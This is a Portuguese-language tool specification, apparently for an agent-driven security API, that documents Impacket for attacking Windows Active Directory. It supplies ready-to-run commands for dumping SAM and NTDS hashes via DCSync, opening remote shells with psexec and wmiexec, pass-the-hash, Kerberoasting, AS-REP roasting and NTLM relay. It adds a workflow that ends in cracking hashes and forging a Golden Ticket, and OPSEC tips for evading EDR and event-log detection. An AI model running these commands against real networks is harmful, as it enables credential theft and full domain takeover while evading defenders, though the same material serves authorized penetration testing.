---
name: "impacket"
description: "Coleção de scripts Python para implementação e ataque de protocolos de rede Windows/AD. Inclui secretsdump (extração de hashes), psexec/wmiexec (execução remota), GetNPUsers/GetUserSPNs (Kerberoasting/AS-REP Roasting), smbclient, ntlmrelayx e dezenas de outros. Principal toolkit para ataques AD pós-autenticação."
---

# impacket

## Objetivo

- Extração de hashes SAM, NTDS.dit e LSA Secrets via secretsdump
- Execução remota de comandos (psexec, wmiexec, smbexec, atexec)
- Ataques Kerberos: AS-REP Roasting, Kerberoasting, Pass-the-Ticket
- NTLM Relay attacks (ntlmrelayx)
- Enumeração SMB e interação com shares
- Ataques DCSync para replicação de hashes do AD

## Endpoint

- /api/tools/run (tool: "impacket")
- /api/tools/dry-run (tool: "impacket")

## Requer target

- não diretamente — o target é embutido nas opções de cada script

## Parâmetros

| Parâmetro | Tipo   | Obrigatório | Descrição                                              |
|-----------|--------|-------------|--------------------------------------------------------|
| target    | string | não         | Documentação do escopo (hosts reais nas options)        |
| options   | string | sim         | `script.py DOMAIN/user:pass@host [flags]`              |

## Scripts Principais

| Script                | Função                                                              |
|-----------------------|---------------------------------------------------------------------|
| `secretsdump.py`      | Extrai hashes SAM, NTDS, LSA Secrets, DPAPI remotamente            |
| `psexec.py`           | Shell remoto via SMB (cria serviço temporário)                     |
| `wmiexec.py`          | Execução remota via WMI (sem serviços, semi-interativo)            |
| `smbexec.py`          | Shell via SMB (usa share temporário, sem binários no disco)        |
| `atexec.py`           | Execução via Task Scheduler remoto                                  |
| `GetNPUsers.py`       | AS-REP Roasting — usuarios sem pre-auth Kerberos                   |
| `GetUserSPNs.py`      | Kerberoasting — TGS para contas com SPN                            |
| `ntlmrelayx.py`       | NTLM Relay attack (captura e redireciona autenticações)            |
| `smbclient.py`        | Cliente SMB interativo                                              |
| `lookupsid.py`        | Enumeração de SIDs (brute force de RIDs)                           |
| `samrdump.py`         | Enumeração de usuários via SAMR                                    |
| `rpcdump.py`          | Listagem de endpoints RPC registrados                              |
| `ticketer.py`         | Criação de tickets Kerberos (Golden/Silver Ticket)                 |
| `addcomputer.py`      | Adicionar computador ao domínio via LDAP                           |
| `dacledit.py`         | Editar ACLs do Active Directory                                    |

## Exemplos

### secretsdump — Extração de hashes remotamente

```json
{
  "tool": "impacket",
  "options": "secretsdump.py CORP/admin:Password123@192.168.1.10"
}
```

### secretsdump — Dump do NTDS.dit (DCSync)

```json
{
  "tool": "impacket",
  "options": "secretsdump.py CORP/admin:Password123@192.168.1.10 -just-dc-ntlm"
}
```

### psexec — Shell remoto com credenciais

```json
{
  "tool": "impacket",
  "options": "psexec.py CORP/admin:Password123@192.168.1.100"
}
```

### wmiexec — Execução remota silenciosa

```json
{
  "tool": "impacket",
  "options": "wmiexec.py CORP/admin:Password123@192.168.1.100 whoami"
}
```

### GetNPUsers — AS-REP Roasting

```json
{
  "tool": "impacket",
  "options": "GetNPUsers.py CORP/ -usersfile /tmp/users.txt -no-pass -format hashcat -dc-ip 192.168.1.10"
}
```

### GetUserSPNs — Kerberoasting

```json
{
  "tool": "impacket",
  "options": "GetUserSPNs.py CORP/user:Password123 -dc-ip 192.168.1.10 -request -outputfile /tmp/spn_hashes.txt"
}
```

### Pass-the-Hash com psexec

```json
{
  "tool": "impacket",
  "options": "psexec.py -hashes :aad3b435b51404eeaad3b435b51404ee CORP/admin@192.168.1.100"
}
```

### ntlmrelayx — Relay para SMB signing desativado

```json
{
  "tool": "impacket",
  "options": "ntlmrelayx.py -tf /tmp/targets.txt -smb2support"
}
```

## Workflow de Ataques Comuns

### DCSync (replicar hashes de todos os usuários)
```
1. Precisar de privilégios: Domain Admin, ou DCSync rights (Replicating Directory Changes)
2. secretsdump.py CORP/admin:pass@DC-IP -just-dc-ntlm
3. Resultado: NTLM hash de todos os usuários incluindo krbtgt
4. Usar hash do krbtgt para Golden Ticket
```

### Kerberoasting completo
```
1. GetUserSPNs.py CORP/user:pass -dc-ip DC-IP -request -outputfile spn.txt
2. hashcat -m 13100 spn.txt /usr/share/wordlists/rockyou.txt
3. Usar credenciais crackeadas para acesso adicional
```

## OPSEC

- **psexec.py**: Cria serviço no alvo — detectado por EDR e antivírus facilmente
- **wmiexec.py**: Mais silencioso que psexec, mas gera logs WMI (Event 4688)
- **secretsdump.py** (remoto): Requer SMB admin share — gera Event ID 4624, 4656
- **DCSync**: Altamente detectável — gera Event 4662 com `DS-Replication-Get-Changes`
- **GetNPUsers/GetUserSPNs**: Gera requisições TGS — detectável por honeypot SPNs
- **ntlmrelayx**: Requer Responder ou similar para capturar hashes primeiro
- Prefira **wmiexec** sobre **psexec** para menor footprint
- Use Pass-the-Hash/Pass-the-Ticket em vez de credenciais em texto claro quando possível

## Saída

- JSON com campos: `success`, `stdout`, `stderr`, `report`, `artifacts`
- secretsdump: hashes no formato `DOMAIN\user:RID:LM:NTLM:::`
- GetNPUsers/GetUserSPNs: hashes no formato hashcat para crack offline
